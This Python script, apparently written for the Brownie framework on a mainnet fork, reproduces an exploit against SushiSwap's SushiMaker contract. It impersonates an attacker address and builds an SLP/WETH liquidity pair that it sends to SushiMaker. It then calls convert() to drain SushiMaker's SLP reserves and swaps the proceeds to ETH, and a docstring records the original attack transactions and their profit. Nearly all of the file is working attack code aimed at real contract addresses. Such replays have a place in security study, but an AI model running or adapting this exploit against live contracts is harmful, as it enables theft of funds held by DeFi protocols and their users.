from brownie import accounts, interface, chain
from brownie.network import web3

'''
{
    "YFI/WETH": {
        "0x18be4ac177c5ada3522e3cafd6c40d750d4288a3a7b22e140521124074fed2ae": "Swap Exact ETH For Tokens",
        "0xc8653ef0c4658acf3d44059babea07c62578769cac10176e61310f7af04e1597": "Approve",
        "0x18ed3e5efeec3e475501786541a4f7602340e5aa6bc6cbf24b9c9aa1062449ac": "Add Liquidity ETH",
        "0x42d553b614d0a64ea2cfe95bf2a99d337c07f1b53ac4d7987966fc39817975e6": "Approve",
        "0x041463e755e91548b9d6dd1e61519b08f101ff96a44df969b33ee57996619a88": "Add Liquidity ETH",
        "0x8a2d7926e50123459b7814c0e19b5ac59f7ce221cb5fa82f79d2c0c37ef7ef1f": "Transfer",
        "0xaa001ac10841c784954b0028192f0ea232bf84e390b964af98f1c49074ec4beb": "Convert",
        "0x08bbbeaf7cbd2649738812cf720042eb7ebe1411be2f7cf3ede41411dcbf8bc0": "Swap Exact ETH For Tokens",
        "0x3952f24ef1e5dce37463edcf0f3902316131fb823d79946b96f2a2397a9cd25d": "Remove Liquidity ETH",
        "0x47c200fefd8c007d972b65b97dadf429c3e6e91359b7b49aaa66ee0fc4a555f4": "Swap Exact Tokens For ETH"
    },
    "profit": "0.2558139 ether"
}
'''
MAX = (1 << 256)-1
weth = interface.WETH('0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2')
yfi = interface.YFI('0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e')

hacker = accounts.at(
    '0x1925e832c22522e0d9947ee4677120b2f28e4cd4', force=True)
sushi_maker = interface.SushiMaker(
    '0x6684977bBED67e101BB80Fc07fCcfba655c0a64F')
sushi_router = interface.SushiRouter(
    '0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f')
sushi_factory = interface.IUniswapV2Factory(
    '0xc0aee478e3658e2610c5f7a4a2e1777ce9e4f2ac')
token0, token1 = (weth, yfi) if weth.address < yfi.address else (yfi, weth)
slp = interface.UniswapV2Pair(sushi_factory.getPair(token0, token1))


def main():

    print(
        f"[before] Attacker's ETH: {web3.fromWei(hacker.balance(), 'ether')}")
    print(f"[before] Attacker's WETH: {weth.balanceOf(hacker)/1e18}")
    total_eth = hacker.balance() + weth.balanceOf(hacker)
    print(f"[before] Attacker's total ETH: {total_eth/1e18}")
    print(f"[before] Attacker's YFI: {yfi.balanceOf(hacker)}")

    _r0, _r1, _ = slp.getReserves()
    r0, r1 = (_r0, _r1) if token0 == yfi else (_r1, _r0)
    print(
        f'[before:pair(YFI/WETH) reserve] YFI={r0}, WETH={r1}, radio={r0/r1}')

    print('------ Step 1: swap some ETH for YFI ------')
    _amount_eth = sushi_router.getAmountIn(30000000000, r1, r0)
    # lemma: first add liquidity require amount0 * amount1 > 10**6
    sushi_router.swapETHForExactTokens(30000000000, [weth, yfi], hacker, chain.time() + 120, {
        'from': hacker, 'value': _amount_eth})

    print('------ step 2: approve(YFI: Hacker to Router) ------')
    yfi.approve(sushi_router, MAX, {'from': hacker})

    print('------ step 3: add liquidity to obtain SLP ------')
    sushi_router.addLiquidityETH(
        yfi, 30000000000, 0, 0, hacker, chain.time() + 120, {'from': hacker, 'value': 1e18})

    print('------ step 4: approve(SLP: Hacker to Router) ------')
    slp.approve(sushi_router, MAX, {'from': hacker})

    # if slp.balanceOf(sushi_maker) > 0:
    #     print('------ step 6: convert(burn slpp to slp + token) ------')
    #     # In this step, SushiMaker loss a lot SLP reserve in it before.
    #     sushi_maker.convert(slp, yfi, {'from': hacker})

    print('------ step 5: add liquidity to obtain SLPP ------')
    sushi_router.addLiquidityETH(slp, slp.balanceOf(
        hacker), 0, 0, sushi_maker, chain.time() + 120, {'from': hacker, 'value': 1e18})

    slpp = interface.UniswapV2Pair(
        sushi_factory.getPair(weth.address, slp.address))
    _r0, _r1, _ = slpp.getReserves()
    r0, r1 = (_r0, _r1) if token0 == slp else (_r1, _r0)
    print(
        f'[before:pair(SLP/WETH) reserve] SLP={r0}, WETH={r1}, radio={r0/r1}')

    steal_amount = slp.balanceOf(sushi_maker)
    print('------ step 6: convert(burn slpp to slp + token) ------')
    # In this step, SushiMaker loss a lot SLP reserve in it before.
    sushi_maker.convert(slp, weth, {'from': hacker})

    _r0, _r1, _ = slp.getReserves()
    r0, r1 = (_r0, _r1) if token0 == yfi else (_r1, _r0)
    print(f'[after:pair(YFI/WETH) reserve] YFI={r0}, WETH={r1}, radio={r0/r1}')

    _r0, _r1, _ = slpp.getReserves()
    r0, r1 = (_r0, _r1) if token0 == slp else (_r1, _r0)
    print(
        f'[after:pair(SLP/WETH) reserve] SLP={r0}, WETH={r1}, radio={r0/r1}')

    print('------ step 7: convert profit to eth ------')
    # sushi_router.swapExactETHForTokens(
    #     0, [weth, slp], hacker, chain.time() + 120, {'from': hacker, 'value': 1e16})

    sushi_router.swapETHForExactTokens(
        steal_amount, [weth, slp], hacker, chain.time() + 120, {'from': hacker, 'value': 1e18})

    sushi_router.removeLiquidityETH(yfi, slp.balanceOf(
        hacker), 0, 0, hacker, chain.time() + 120, {'from': hacker})

    sushi_router.swapExactTokensForETH(yfi.balanceOf(
        hacker), 0, [yfi, weth], hacker, chain.time() + 120, {'from': hacker})

    print(
        f"[after] Attacker's ETH: {web3.fromWei(hacker.balance(), 'ether')}")
    print(f"[after] Attacker's WETH: {weth.balanceOf(hacker)/1e18}")
    total_eth = hacker.balance() + weth.balanceOf(hacker)
    print(f"[before] Attacker's total ETH: {total_eth/1e18}")
    print(f"[after] Attacker's YFI: {yfi.balanceOf(hacker)}")
